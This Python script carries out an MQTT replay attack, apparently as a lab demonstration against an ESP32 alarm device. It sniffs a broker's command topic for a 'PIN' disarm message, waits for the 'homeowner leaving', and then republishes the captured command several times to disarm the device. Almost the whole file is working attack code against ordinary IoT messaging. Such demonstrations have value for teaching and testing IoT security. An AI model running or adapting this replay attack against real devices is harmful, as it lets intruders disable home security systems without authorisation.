import time

from replay_helpers import create_mqtt_client, connect_and_start, stop_and_disconnect, publish_payloads, load_replay_config

config = load_replay_config()

captured_payload = None

# This function runs when the hacker "sniffs" your message
def on_message(client, userdata, msg):
    global captured_payload
    captured_payload = msg.payload.decode(errors="replace")
    print(f"\n🕵️ SNIFFER: Captured legitimate command -> {captured_payload}")
    print("Stopping sniffer... Target payload saved in memory.")
    client.disconnect()

def sniff_command():
    print("📡 Phase 1: Sniffing network for a 'PIN' command...")
    print("ACTION REQUIRED: Go to MQTT Explorer and send the PIN now!")

    sniff_client = create_mqtt_client("Hacker_Sniffer", on_message)
    connect_and_start(sniff_client, config["broker_ip"], config["port"])
    sniff_client.subscribe(config["cmd_topic"])
    sniff_client.loop_forever()

def replay_payload(payload, repeat=5, interval=0.5):
    if not payload:
        print("⚠️ No payload captured. Replay aborted.")
        return

    print("\n⏱️ Phase 2: Waiting 15 seconds (Simulating the homeowner leaving)...")
    time.sleep(15)

    print(f"🔥 Phase 3: REPLAYING CAPTURED COMMAND: {payload}")
    replay_client = create_mqtt_client("Hacker_Replay_Device")
    connect_and_start(replay_client, config["broker_ip"], config["port"])
    
    publish_payloads(replay_client, config["cmd_topic"], [payload] * repeat, interval)

    stop_and_disconnect(replay_client)
    print("\n✅ Replay Attack Finished. ESP32 should now be DISARMED.")


if __name__ == "__main__":
    sniff_command()
    replay_payload(captured_payload)